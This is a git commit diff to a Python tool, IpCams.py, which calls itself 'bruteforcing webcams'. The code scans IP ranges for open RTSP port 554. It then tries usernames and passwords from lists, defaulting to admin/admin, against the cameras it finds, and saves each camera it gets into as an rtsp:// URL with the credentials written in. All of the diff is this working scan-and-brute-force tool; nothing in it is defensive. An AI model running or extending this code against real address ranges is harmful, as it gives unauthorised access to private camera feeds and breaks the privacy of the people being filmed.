9d83e519091b23f9bd44ae221e1e0d849c79d197
Marincheko Anton <narn01style@gmail.com>
2023-10-08 20:32:31 +0300

    dev brute and scan

--- tools/IpCams.py
+++ tools/IpCams.py
@@ -5,16 +5,21 @@ import base64
 import re
 import queue
 import time
+import sys
 from pathlib import Path
 
 about = "bruteforcing webcams by http/https"
 class main(object):
     def __init__(self):
+        self.password_list = None
+        self.login_list = None
         self.running = True
         self.ip_ranges = []
         self.founded_targets = []
+        self.brute_result = []
         self.port = 554
-        self.timeout = 2
+        self.threads = 20
+        self.scan_timeout = 2
         
     def run(self):
         while self.running:
@@ -24,57 +29,130 @@ class main(object):
             if command[0] == "set":
                 match (command[1]):
                     case "ip_ranges":
-                        self.ip_ranges = command[2].split(",")
+                        try:
+                            self.ip_ranges = command[2].split(",")
+                            print(f"[ ip_ranges > {len(self.ip_ranges)} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback)
+                            else:
+                                print(f"[ value must be list]")
+                                
                     case "port":
-                        self.port = int(command[2])
-                    case "timeout":
-                        self.port = int(command[2])
+                        try:
+                            self.port = int(command[2])
+                            print(f"[ port > {self.port} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback)
+                            else:
+                                print(f"[ value must be num]")
+                    case "scan_timeout":
+                        try:
+                            self.scan_timeout = int(command[2])
+                            print(f"[ scan_timeout > {self.scan_timeout} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback)
+                            else:
+                                print(f"[ value must be num]")
+                    case "password_list":
+                        try:
+                            self.password_list = str(command[2])
+                            print(f"[ password_list > {self.password_list} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback)
+                            else:
+                                print(f"[ value must be path]")
+                    case "login_list":
+                        try:
+                            self.login_list = str(command[2])
+                            print(f"[ login_list > {self.login_list} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback)
+                            else:     
+                                print(f"[ value must be path]")
+                                
+            if command[0] == "load_targets":
+                try:
+                    self.load_targets(command[1])
+                except Exception as e:
+                    if "--debug" in sys.argv:
+                        print(e.with_traceback)
+                    else:  
+                        print('[ print(f"[ value must be path]") ]')
+            
             if command[0] == "show":
-                print(f"ip_ranges: {str(self.ip_ranges)}", end="\n")
+                print(f"ip_ranges: {len(self.ip_ranges)}", end="\n")
                 print(f"founded_targets: {str(len(self.founded_targets))}", end="\n")
+                print(f"login_list: {str(self.login_list)}", end="\n")
+                print(f"password_list: {str(self.password_list)}", end="\n")
                 print(f"port: {str(self.port)}", end="\n")
-                print(f"timeout: {str(self.timeout)}", end="\n")
+                print(f"scan_timeout: {str(self.scan_timeout)}", end="\n")
             
             if command[0] == "run":
                 
                 if len(command) != 2:
-                    print("run scan/brute")
+                    print("[ run scan/brute ]")
                 else:        
                     if command[1] == "scan":
                         self.module_scan_run()
-                        
+                        print(f"[ Targets Found: {len(self.founded_targets)} ]")
                     if command[1] == "brute":
                         self.module_brute_run()
-                    
-            if command[0] == "save_targets":
-                with open("scan_result.txt", "w") as f:
-                    for ip in self.founded_targets:
-                        f.write(f"{ip}\n")
-                    f.close
-                    print("Done")
+                        
             if command[0] == "quit":
                 return 0
             
     def module_scan_run(self):
         for ip_range in self.ip_ranges: 
             self.scan_for_targets(ip_range)
+        with open("IpCams_scan_result.txt", "w") as f:
+            for ip in self.founded_targets:
+                f.write(f"{ip}\n")
+            print("[ Result saved in IpCams_scan_result.txt ]")
     
+    def load_targets(self, path):
+        with open(path, "r") as f:
+            ips = f.read()
+        self.founded_targets = ips.split("\n")
+        print(f"[ Loaded {len(self.founded_targets)} targets ]")
+    
+
+
     def module_brute_run(self):
         if len(self.founded_targets) > 0:
-            for ip in self.founded_targets:
-                RtspBrute(ip, "admin", "admin123", self.port ).run()
+            if self.login_list is None:
+                    self.login_list = "admin"
+                    
+            if self.password_list is None:
+                self.password_list = "admin"
+                
+            url = RtspBrute("./IpCams_scan_result.txt", self.login_list, self.password_list, self.port ).run() 
+            if url is not None:
+                self.brute_result.append(url)
+                
+            with open("IpCams_brute_result.txt", "w") as f:
+                for ip_cam in self.brute_result:
+                    f.write(f"{ip_cam}\n")
+                print("[ Result saved in IpCams_brute_result.txt ]")
+                
+            print(f"[ Total - {len(self.brute_result)} ]")
             
-     
     def scan_for_targets(self, ip_range):
         range_start_end = ip_range.split("-")
         start_ip = range_start_end[0].split(".") 
         end_ip =  range_start_end[1].split(".") 
         ips = list()
         for a in range(int(start_ip[0]), int(end_ip[0])+1):
+            
             for b in range(int(start_ip[1]), int(end_ip[1])+1):
                 for c in range(int(start_ip[2]), int(end_ip[2])+1):
-                    for d in range(int(start_ip[3]), int(end_ip[3])+1):
+                    for d in range(int(start_ip[3]), int(end_ip[3])+1):   
                         ips.append(f'{str(a)}.{str(b)}.{str(c)}.{str(d)}')
+                        
         threads = []
         for num in range(0,len(ips)):
             threads.append(threading.Thread(target=self.port_check, args=(ips[num], int(self.port))))
@@ -87,18 +165,19 @@ class main(object):
                         
     def port_check(self,ip, port):
         target = socket.gethostbyname(ip)
-        socket.setdefaulttimeout(self.timeout)
+        socket.setdefaulttimeout(self.scan_timeout)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ans = s.connect_ex((target,port))
         s.close()
         if ans == 0:
             self.founded_targets.append(ip)
             
+#####################################################           
             
-
 class RtspBrute(object):
     def __init__(self, target, username, password, port):
         self.port = port
+        self.brute_result = None
         self.targetlist = self.param_to_list(target, method='target')
         self.usernamelist = self.param_to_list(username)
         self.passwordlist = self.param_to_list(password)
@@ -120,7 +199,8 @@ class RtspBrute(object):
             t.start()
         for t in _threads:
             t.join()
-
+        return self.brute_result
+    
     def vaild_target(self, target):
         regex = re.compile(
             r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
@@ -180,7 +260,7 @@ class RtspBrute(object):
             target = q.get()
             # print(target)
             data = self.rtsp_request(target=target)
-            if data:
+            if data and data is not None:
                 if "401 Unauthorized" in data:
                     # print("401 Unauthorized")
                     for username in self.usernamelist:
@@ -189,17 +269,19 @@ class RtspBrute(object):
                             if "WWW-Authenticate: Basic" in data:
                                 data = self.rtsp_request(
                                     target, username, password)
-                                if "200 OK" in data:
-                                    print(
-                                        "rtsp://{}@{}:{}".format(username, password, target ))
-                                    pass
-                                if "401 Unauthorized" in data:
-                                    time.sleep(1)
-                                    # print("401 Unauthorized")
-                                    continue
-                    pass
+                                if data is not None:
+                                    if "200 OK" in data:
+                                        print("rtsp://{}/av1&user={}&password={}".format(target, username, password))
+                                        self.brute_result = str("rtsp://{}/av1&user={}&password={}".format(target, username, password))
+                                        pass
+                                    if "401 Unauthorized" in data:
+                                        time.sleep(1)
+                                        # print("401 Unauthorized")
+                                        continue
+                        pass
                 elif "200 OK" in data:
-                    print(f"No AUTH: rtsp://{target}")
+                    print(f"rtsp://{target}/av1")
+                    self.brute_result = f"rtsp://{target}/av1"
                 else:
                     pass
                     # print("Unkonwn problem from %s" % target)
